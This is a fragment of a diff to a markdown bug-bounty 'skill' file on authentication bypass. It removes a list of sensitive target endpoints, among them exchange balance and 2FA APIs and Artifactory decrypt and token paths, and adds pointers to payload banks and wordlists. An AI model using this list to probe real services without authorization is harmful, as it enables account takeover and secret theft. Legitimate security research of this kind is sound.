-/api/bitcoinDepositAddresses
-/api/bitcoinWithdrawalFees
-/api/transferHistory
-/api/transactionHistory
-/api/tradeHistory
-/api/openOrders
-/api/orderHistory
-/api/traderFees
-/api/balances
-/users
-/api/2fa
-/api/2fa/verify
-/pocs/digits-bridge-origin-validation-bypass/
-/web/digits/getting-started.html
-/login_status
-/artifactory/api/system/configuration
-/artifactory/corda-dev
-/artifactory/api/repositories/rce-test-remote
-/access/api/v1/tokens
-/access/api/v1/registry/join
-/artifactory/api/system/decrypt
-```
-
-## Source skills merged into this topic
-
-- `h1skills` — `hackerone-auth-bypass`
-- `hunting` — `auth-bypass`
-- `cbh` — `hunt-auth-bypass`
-
-## Provenance
-
-- `references/unified-method.md` — same deduplicated union as this file, for tooling
-- `references/upstream-*.md` — unmodified original SKILL.md from each repo
-- `references/upstream-assets/` — 2 companion files
-- `../../upstream/` — complete unmodified archives of all five source repositories
+- `references/evidence.md` — corpus technique frequencies, case studies, approach patterns
+- `references/payloads.md` — curated payload bank + upstream payload references
+- `references/wordlists/` — 2 mined paths/params/payload lists
 - `bbhunt-methodology` — orchestrator, state machine and class router
